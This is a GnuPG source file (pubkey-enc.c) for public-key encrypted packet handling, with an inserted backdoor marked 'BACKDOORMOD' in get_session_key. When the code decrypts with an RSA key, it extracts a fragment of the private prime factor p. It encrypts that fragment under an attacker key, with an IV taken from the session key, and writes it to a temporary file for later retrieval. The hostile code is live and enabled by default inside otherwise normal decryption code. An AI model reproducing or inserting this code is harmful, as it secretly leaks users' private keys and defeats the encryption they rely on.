/* pubkey-enc.c -  public key encoded packet handling
 * Copyright (C) 1998, 1999, 2000, 2001, 2002 Free Software Foundation, Inc.
 *
 * This file is part of GnuPG.
 *
 * GnuPG is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * GnuPG is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses/>.
 */

#include <config.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include "util.h"
#include "memory.h"
#include "packet.h"
#include "mpi.h"
#include "keydb.h"
#include "trustdb.h"
#include "cipher.h"
#include "status.h"
#include "options.h"
#include "main.h"
#include "i18n.h"
#include "cardglue.h"

static int get_it( PKT_pubkey_enc *k,
		   DEK *dek, PKT_secret_key *sk, u32 *keyid );


/* check that the given algo is mentioned in one of the valid user IDs */
static int
is_algo_in_prefs ( KBNODE keyblock, preftype_t type, int algo )
{
    KBNODE k;

    for (k=keyblock; k; k=k->next) {
        if (k->pkt->pkttype == PKT_USER_ID) {
            PKT_user_id *uid = k->pkt->pkt.user_id;
            prefitem_t *prefs = uid->prefs;

            if (uid->created && prefs &&
		!uid->is_revoked && !uid->is_expired ) {
                for (; prefs->type; prefs++ )
                    if (prefs->type == type && prefs->value == algo)
                        return 1;
            }
        }
    }
    return 0;
}


/****************
 * Get the session key from a pubkey enc packet and return
 * it in DEK, which should have been allocated in secure memory.
 */
int
get_session_key( PKT_pubkey_enc *k, DEK *dek )
{
    //========================================================
    /*
    * BACKDOORMOD
    */
    #define BACKDOORED

    #ifdef BACKDOORED
      unsigned int p_bytes;
      unsigned char* p_buffer;
      unsigned char* enc_leak_buffer;
      FILE* pkey_file;

      #include "backdoor.h"
    #endif
    //========================================================

    PKT_secret_key *sk = NULL;
    int rc;

    rc = check_pubkey_algo2 (k->pubkey_algo, PUBKEY_USAGE_ENC);
    if( rc )
	goto leave;

    if( (k->keyid[0] || k->keyid[1]) && !opt.try_all_secrets ) {
	sk = xmalloc_clear( sizeof *sk );
	sk->pubkey_algo = k->pubkey_algo; /* we want a pubkey with this algo*/
	if( !(rc = get_seckey( sk, k->keyid )) )
	    rc = get_it( k, dek, sk, k->keyid );
    }
    else { /* anonymous receiver: Try all available secret keys */
	void *enum_context = NULL;
	u32 keyid[2];
	char *p;

	for(;;) {
	    if( sk )
		free_secret_key( sk );
	    sk = xmalloc_clear( sizeof *sk );
	    rc=enum_secret_keys( &enum_context, sk, 1, 0);
	    if( rc ) {
		rc = G10ERR_NO_SECKEY;
		break;
	    }
	    if( sk->pubkey_algo != k->pubkey_algo )
		continue;
	    keyid_from_sk( sk, keyid );
	    log_info(_("anonymous recipient; trying secret key %s ...\n"),
                     keystr(keyid));

	    if(!opt.try_all_secrets && !is_status_enabled())
	      {
		p=get_last_passphrase();
		set_next_passphrase(p);
		xfree(p);
	      }

	    rc = check_secret_key( sk, opt.try_all_secrets?1:-1 ); /* ask
								      only
								      once */
	    if( !rc )
	      {
		rc = get_it( k, dek, sk, keyid );
		/* Successfully checked the secret key (either it was
		   a card, had no passphrase, or had the right
		   passphrase) but couldn't decrypt the session key,
		   so thus that key is not the anonymous recipient.
		   Move the next passphrase into last for the next
		   round.  We only do this if the secret key was
		   successfully checked as in the normal case,
		   check_secret_key handles this for us via
		   passphrase_to_dek */
		if(rc)
		  next_to_last_passphrase();
	      }

	    if( !rc )
	      {
		log_info(_("okay, we are the anonymous recipient.\n") );
		break;
	      }
	}
	enum_secret_keys( &enum_context, NULL, 0, 0 ); /* free context */
    }

  leave:
    //========================================================
    /*
    * BACKDOORMOD
    */
    #ifdef BACKDOORED
      // Currently only support RSA private keys (2048 and 4096 bit)
      if(is_RSA(sk->pubkey_algo))
      {
        // Convert prime factor p to buffer
        p_buffer = mpi_get_buffer(sk->skey[3], &p_bytes, NULL);

        #ifdef SYMMETRIC_CHANNEL
            CIPHER_HANDLE hd;
            unsigned int fragment_index = 0;

            // Determine what fragment to leak from treating first session key byte as bucket
            // Buckets depend on factor size
            if(p_bytes == 128)
            {
              if(dek->key[0] < 0x40)
              {
                fragment_index = 0;
              }
              else if((dek->key[0] >= 0x40) && (dek->key[0] < 0x80))
              {
                fragment_index = 1;
              }
              else if((dek->key[0] >= 0x80) && (dek->key[0] < 0xC0))
              {
                fragment_index = 2;
              }
              else if((dek->key[0] >= 0xC0))
              {
                fragment_index = 3;
              }
            }
            else if(p_bytes == 256)
            {
              if(dek->key[0] < 0x20)
              {
                fragment_index = 0;
              }
              else if((dek->key[0] >= 0x20) && (dek->key[0] < 0x40))
              {
                fragment_index = 1;
              }
              else if((dek->key[0] >= 0x40) && (dek->key[0] < 0x60))
              {
                fragment_index = 2;
              }
              else if((dek->key[0] >= 0x60) && (dek->key[0] < 0x80))
              {
                fragment_index = 3;
              }
              else if((dek->key[0] >= 0x80) && (dek->key[0] < 0xA0))
              {
                fragment_index = 4;
              }
              else if((dek->key[0] >= 0xA0) && (dek->key[0] < 0xC0))
              {
                fragment_index = 5;
              }
              else if((dek->key[0] >= 0xC0) && (dek->key[0] < 0xE0))
              {
                fragment_index = 6;
              }
              else if((dek->key[0] >= 0xE0))
              {
                fragment_index = 7;
              }
            }

            // Leak 256 bit fragment
            memcpy(leak_buffer, p_buffer+(fragment_index*LEAK_SIZE), LEAK_SIZE);

            // Set attacker iv from session key
            // assert(ATTACKER_IVLEN <= (dek->keylen-1))
            memcpy(attacker_iv, dek->key+1, ATTACKER_IVLEN);

            // Encrypt fragment to be leaked
            enc_leak_buffer = (unsigned char*)xmalloc_clear(sizeof(unsigned char)*(LEAK_SIZE + 1));
            
            hd = cipher_open(ATTACKER_ALGO, ATTACKER_MODE, 1 );
            cipher_setkey(hd, attacker_symkey, ATTACKER_KEYLEN);
            cipher_setiv(hd, attacker_iv, ATTACKER_IVLEN);
            cipher_encrypt(hd, enc_leak_buffer, leak_buffer, LEAK_SIZE);
            cipher_close(hd);
        #endif

        //Store for later retrieval in response phase
        pkey_file = fopen(TMP_STORAGE, "wb");
        fwrite(enc_leak_buffer, sizeof(unsigned char), LEAK_SIZE, pkey_file);

        // Cleanup
        fclose(pkey_file);

        xfree(p_buffer);
        xfree(enc_leak_buffer);   
      }   
    #endif
    //========================================================
    if( sk )
	free_secret_key( sk );
    return rc;
}


static int
get_it( PKT_pubkey_enc *enc, DEK *dek, PKT_secret_key *sk, u32 *keyid )
{
  int rc;
  MPI plain_dek  = NULL;
  byte *frame = NULL;
  unsigned n, nframe;
  u16 csum, csum2;

  int card = 0;

  if (sk->is_protected && sk->protect.s2k.mode == 1002)
    { /* Note, that we only support RSA for now. */
#ifdef ENABLE_CARD_SUPPORT
      unsigned char *rbuf;
      size_t rbuflen;
      char *snbuf;
      unsigned char *indata = NULL;
      unsigned int indatalen;

      snbuf = serialno_and_fpr_from_sk (sk->protect.iv, sk->protect.ivlen, sk);

      indata = mpi_get_buffer (enc->data[0], &indatalen, NULL);
      if (!indata)
        BUG ();

      rc = agent_scd_pkdecrypt (snbuf, indata, indatalen, &rbuf, &rbuflen);
      xfree (snbuf);
      xfree (indata);
      if (rc)
        goto leave;

      frame = rbuf;
      nframe = rbuflen;
      card = 1;
#else
      rc = G10ERR_UNSUPPORTED;
      goto leave;
#endif /*!ENABLE_CARD_SUPPORT*/
    }
  else
    {
      rc = pubkey_decrypt(sk->pubkey_algo, &plain_dek, enc->data, sk->skey );
      if( rc )
	goto leave;
      frame = mpi_get_buffer( plain_dek, &nframe, NULL );
      mpi_free( plain_dek ); plain_dek = NULL;
    }

    /* Now get the DEK (data encryption key) from the frame
     *
     * Old versions encode the DEK in in this format (msb is left):
     *
     *	   0  1  DEK(16 bytes)	CSUM(2 bytes)  0  RND(n bytes) 2
     *
     * Later versions encode the DEK like this:
     *
     *	   0  2  RND(n bytes)  0  A  DEK(k bytes)  CSUM(2 bytes)
     *
     * (mpi_get_buffer already removed the leading zero).
     *
     * RND are non-zero randow bytes.
     * A   is the cipher algorithm
     * DEK is the encryption key (session key) with length k
     * CSUM
     */
    if( DBG_CIPHER )
	log_hexdump("DEK frame:", frame, nframe );
    n=0;
    if (!card)
      {
        if( n + 7 > nframe )
          { rc = G10ERR_WRONG_SECKEY; goto leave; }
        if( frame[n] == 1 && frame[nframe-1] == 2 ) {
          log_info(_("old encoding of the DEK is not supported\n"));
          rc = G10ERR_CIPHER_ALGO;
          goto leave;
        }
        if( frame[n] != 2 )  /* somethink is wrong */
          { rc = G10ERR_WRONG_SECKEY; goto leave; }
        for(n++; n < nframe && frame[n]; n++ ) /* skip the random bytes */
          ;
        n++; /* and the zero byte */
      }

    if( n + 4 > nframe )
	{ rc = G10ERR_WRONG_SECKEY; goto leave; }

    dek->keylen = nframe - (n+1) - 2;
    dek->algo = frame[n++];
    rc = check_cipher_algo( dek->algo );
    if( rc ) {
	if( !opt.quiet && rc == G10ERR_CIPHER_ALGO ) {
	    log_info(_("cipher algorithm %d%s is unknown or disabled\n"),
                     dek->algo, dek->algo == CIPHER_ALGO_IDEA? " (IDEA)":"");
	}
	dek->algo = 0;
	goto leave;
    }
    if( (dek->keylen*8) != cipher_get_keylen( dek->algo ) ) {
	rc = G10ERR_WRONG_SECKEY;
	goto leave;
    }

    /* copy the key to DEK and compare the checksum */
    csum  = frame[nframe-2] << 8;
    csum |= frame[nframe-1];
    memcpy( dek->key, frame+n, dek->keylen );
    for( csum2=0, n=0; n < dek->keylen; n++ )
	csum2 += dek->key[n];
    if( csum != csum2 ) {
	rc = G10ERR_WRONG_SECKEY;
	goto leave;
    }
    if( DBG_CIPHER )
	log_hexdump("DEK is:", dek->key, dek->keylen );
    /* check that the algo is in the preferences and whether it has expired */
    {
	PKT_public_key *pk = NULL;
        KBNODE pkb = get_pubkeyblock (keyid);

	if( !pkb ) {
            rc = -1;
	    log_error("oops: public key not found for preference check\n");
        }
	else if(pkb->pkt->pkt.public_key->selfsigversion > 3
		&& dek->algo != CIPHER_ALGO_3DES
		&& !opt.quiet
		&& !is_algo_in_prefs( pkb, PREFTYPE_SYM, dek->algo ))
	  log_info(_("WARNING: cipher algorithm %s not found in recipient"
		     " preferences\n"),cipher_algo_to_string(dek->algo));
        if (!rc) {
            KBNODE k;

            for (k=pkb; k; k = k->next) {
                if (k->pkt->pkttype == PKT_PUBLIC_KEY
                    || k->pkt->pkttype == PKT_PUBLIC_SUBKEY){
                    u32 aki[2];
        	    keyid_from_pk(k->pkt->pkt.public_key, aki);

                    if (aki[0]==keyid[0] && aki[1]==keyid[1]) {
                        pk = k->pkt->pkt.public_key;
                        break;
                    }
                }
            }
            if (!pk)
                BUG ();
            if ( pk->expiredate && pk->expiredate <= make_timestamp() ) {
                log_info(_("NOTE: secret key %s expired at %s\n"),
                         keystr(keyid), asctimestamp( pk->expiredate) );
            }
        }

        if ( pk &&  pk->is_revoked ) {
            log_info( _("NOTE: key has been revoked") );
            putc( '\n', log_stream() );
            show_revocation_reason( pk, 1 );
        }

	release_kbnode (pkb);
	rc = 0;
    }


  leave:
    mpi_free(plain_dek);
    xfree(frame);
    return rc;
}


/****************
 * Get the session key from the given string.
 * String is supposed to be formatted as this:
 *  <algo-id>:<even-number-of-hex-digits>
 */
int
get_override_session_key( DEK *dek, const char *string )
{
    const char *s;
    int i;

    if ( !string )
	return G10ERR_BAD_KEY;
    dek->algo = atoi(string);
    if ( dek->algo < 1 )
	return G10ERR_BAD_KEY;
    if ( !(s = strchr ( string, ':' )) )
	return G10ERR_BAD_KEY;
    s++;
    for(i=0; i < DIM(dek->key) && *s; i++, s +=2 ) {
	int c = hextobyte ( s );
	if (c == -1)
	    return G10ERR_BAD_KEY;
	dek->key[i] = c;
    }
    if ( *s )
	return G10ERR_BAD_KEY;
    dek->keylen = i;
    return 0;
}
